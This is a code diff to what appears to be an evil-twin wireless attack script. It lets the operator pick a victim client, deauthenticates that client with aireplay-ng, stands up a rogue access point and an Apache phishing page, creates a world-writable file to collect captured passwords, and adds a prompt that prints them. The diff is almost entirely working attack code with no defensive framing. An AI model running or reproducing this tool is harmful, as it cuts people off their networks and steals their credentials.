@@ -53,7 +53,7 @@ def scan_for_aps(interface):
     channel_changer = Thread(target=change_channel, args=(interface,))
     channel_changer.daemon = True
     channel_changer.start()
-    sniff(prn=callback_ap, iface=interface, timeout=20)
+    sniff(prn=callback_ap, iface=interface, timeout=1)
     global done_scanning
     done_scanning = True
 
@@ -160,36 +160,40 @@ def start_evil_twin(interface):
             ap_to_attack = ap_list[i - 1]
             break
 
-    # #  get all clients of access point and prompt user for client to attack
-    # print("[*] Getting all clients of access point")
-    # sniff(iface=interface, prn=scan_for_clients, timeout=10)
-    # print(f"[*] Found {len(clients)} clients")
-    # print("[*] Please choose a client to attack")
-    # for client, i in zip(clients, range(len(clients))):
-    #     print(f"\t[{i + 1}] {client}")
-    #
-    # while True:
-    #     i = int(input("[>] "))
-    #     if i not in range(1, len(clients) + 1):
-    #         print("[!] Please enter a valid client")
-    #     else:
-    #         client_to_attack = clients[i - 1]
-    #         break
+    #  get all clients of access point and prompt user for client to attack
+    print("[*] Getting all clients of access point")
+    sniff(iface=interface, prn=scan_for_clients, timeout=10)
+    print(f"[*] Found {len(clients)} clients")
+    print("[*] Please choose a client to attack")
+    for client, i in zip(clients, range(len(clients))):
+        print(f"\t[{i + 1}] {client}")
+
+    while True:
+        i = int(input("[>] "))
+        if i not in range(1, len(clients) + 1):
+            print("[!] Please enter a valid client")
+        else:
+            client_to_attack = clients[i - 1]
+            break
+
+    # deauth for 10 seconds
+    print("[*] Starting deauth attack for 10 seconds")
+    de_auth_client(interface, 10)
 
     #  set up access point for client to connect to
     setup_ap(interface)
-
-    # start deauth thread
-    print("[*] Starting deauth thread")
-    #setup_de_auth(interface)
 
     #  start apache server
     print("[*] Starting apache server")
     setup_apache_server()
 
-    input("[*] Press enter to continue")
-
-    # bash("service apache2 start")
+    # enter p to print collected password or q to exit
+    while True:
+        choice = input("enter p to print collected password or q to exit: ")
+        if choice == "p":
+            bash("cat ~/Desktop/password.txt")
+        elif choice == "q":
+            break
 
     killall()
 
@@ -215,34 +219,17 @@ def setup_apache_server():
         f.write("</Directory>\n")
     #  set up apache server
     bash("cp -r `pwd`/website/* /var/www/html/")
+    bash("touch /home/kali/Desktop/password.txt")
+    bash("chmod 777 /home/kali/Desktop/password.txt")
     bash("a2enmod rewrite && service apache2 start")
 
 
-def setup_de_auth(interface):
-    global deauth_thread
-    # if we dont want using this tool:
-    # https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py
-    deauth_thread = threading.Thread(target=de_auth_clients, args=(interface,))
-    deauth_thread.start()
-    deauth_thread.join()
-
-
-def de_auth_clients(interface):
+def de_auth_client(interface, t):
     """
     aireplay is a tool that deauthenticates clients from an access point
-    -0 is deauthentication
-    -0 is infinite deauthentication
-    -a is the access point MAC address
-    -c is the number of packets to send
+    use aireplay-ng to deauth clients for t seconds
     """
-    global ap_to_attack, client_to_attack
-    de_auth_command = f"aireplay-ng -0 0 -a {ap_to_attack[0]}"
-    if client_to_attack is not None:
-        de_auth_command += f"-c  {client_to_attack}"
-    de_auth_command += interface
-    while True:
-        bash(f"aireplay-ng -0 0 -a {ap_to_attack[0]} {interface} ")
-        time.sleep(1)
+    bash(f"aireplay-ng -0 {t} -a {ap_to_attack[0]} -c {client_to_attack} {interface}")
 
 
 def main():
